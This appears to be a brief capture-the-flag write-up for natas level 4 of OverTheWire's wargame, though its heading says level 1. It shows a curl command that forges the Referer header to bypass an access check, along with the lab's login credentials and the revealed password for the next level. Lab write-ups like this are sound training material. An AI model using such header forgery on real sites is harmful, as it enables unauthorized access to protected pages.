# natas level1
natas is CTF with web application.

## using credential is below.
- User:natas4
- Pass:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

check web site by lynx.
`lynx http://natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ@natas4.natas.labs.overthewire.org`

followings is message of this page.
~~~
Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
~~~

~~~
curl http://natas4.natas.labs.overthewire.org -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ -H Referer:http://natas5.natas.labs.overthewire.org/
~~~
I got password of natas5 in this page.
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
